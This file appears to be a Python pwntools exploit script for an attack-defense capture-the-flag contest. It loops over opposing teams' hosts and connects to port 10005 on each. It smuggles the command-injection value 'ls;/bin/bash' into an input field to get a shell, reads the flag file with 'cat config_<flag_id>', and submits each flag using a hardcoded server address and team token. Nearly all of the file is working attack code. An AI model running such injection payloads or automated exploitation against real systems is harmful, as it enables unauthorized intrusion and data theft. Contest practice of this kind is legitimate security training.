from pwn import *
from random import randint
import sys

from os import listdir
from os.path import isfile, join, dirname, abspath
import swpag_client as sc

#context.log_level = 'debug'

def get_flag(host, port, flag_id, token,t):
    c = remote(host,port)
    c.recvline()
    c.recvline()
    c.recvline()
    c.recvline()
    c.recvline()
    c.sendline("d")
    c.recvline()
    c.sendline("param1")
    c.recvline()
    c.sendline("ls;/bin/bash")
    c.recvline() 
    c.sendline("s")  
    data=c.recvline()
    data=c.recvline()
    filename= data[-8:-2].decode("utf-8") 
    data=c.recvline()
    data=c.recvline()
    c.sendline("l")  
    c.recvline()
    c.sendline("config_"+filename)
    data = c.recvline()
    c.sendline("cat config_"+ flag_id )

    data = c.recvline()
    data = c.recvline()

    print(t.submit_flag([data[-17:-1].decode('utf-8')])) 
    c.close()
    return data

url='http://34.195.187.175'
token= '66978175b387ba7b6dee386d16b40b29'
t = sc.Team(url, token);

targets = t.get_targets(5)
for target in targets:
    print(target['hostname'])
    print(target['flag_id'])
    if target['hostname'] == 'team10':
        print("team5") 
    elif target['hostname'] == 'team6':
        print("team9")
    elif target['hostname'] == 'team7':
        print("team7")
    else : 
        try: 
            get_flag(target['hostname'],10005,target['flag_id'],'token',t)
        except:
            print("Srervice down for:"+target['hostname'])  
